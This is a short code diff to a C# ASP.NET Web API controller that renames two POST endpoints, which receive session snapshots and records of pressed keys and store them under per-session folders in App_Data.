@@ -18,8 +18,8 @@ namespace HIT.Web.Controllers
             HttpContext.Current.Server.MapPath("~/App_Data/");
 
         [HttpPost]
-        [Route("ReceiveSnapshot")]
-        public IHttpActionResult ReceiveSnapshot(SnapshotViewModel model)
+        [Route("PostSnapshot")]
+        public IHttpActionResult PostSnapshot(SnapshotViewModel model)
         {
             var currentDate = DateTime.Now;
             var year = currentDate.Year;
@@ -45,8 +45,8 @@ namespace HIT.Web.Controllers
         }
 
         [HttpPost]
-        [Route("ReceiveKeysPressed")]
-        public IHttpActionResult ReceiveKeysPressed(KeysPressedViewModel model)
+        [Route("PostKeysPressed")]
+        public IHttpActionResult PostKeysPressed(KeysPressedViewModel model)
         {
             var filePath = $@"{this.BasePath}\Sessions\{model.SessionId}";
             var fullFilePath = $@"{filePath}\KeysPressed.txt";
